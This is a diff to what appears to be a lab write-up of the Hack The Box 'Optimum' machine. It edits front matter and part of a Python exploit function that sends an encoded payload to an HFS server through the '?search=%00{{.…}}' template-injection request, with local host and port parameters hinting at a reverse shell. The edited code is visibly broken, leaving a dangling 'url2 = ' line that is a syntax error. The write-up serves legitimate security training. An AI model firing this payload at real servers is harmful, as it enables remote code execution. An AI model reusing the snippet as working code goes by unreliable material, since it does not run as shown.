@@ -3,6 +3,7 @@ title: "Optimum - HTB"
 categories: [Windows, Easy]
 tags: [Windows,Easy,Web,RCE,HFS]
 mermaid: true
+render_with_liquid: false
 image: https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Optimum/Optimum.png
 ---
 
@@ -233,9 +234,9 @@ def atkTarget(rhost,rport,lhost,lport):
     # Encode the payload and send a HTTP GET request
     payload_encode = urllib.parse.quote_plus(payload)
     
-    url1 = f'http://{rhost}:{rport}/?search=%00'
-    url2 = '{{.' + payload_encode + '.}}'
-    urllib.request.urlopen(url1 + url2)
+    url = f'http://{rhost}:{rport}/?search=%00{{.{payload_encode}.}}'
+    url2 = 
+    urllib.request.urlopen(url)
     print("\n[+] Sending encoded payload via GET request to target")
 
     # Print some information
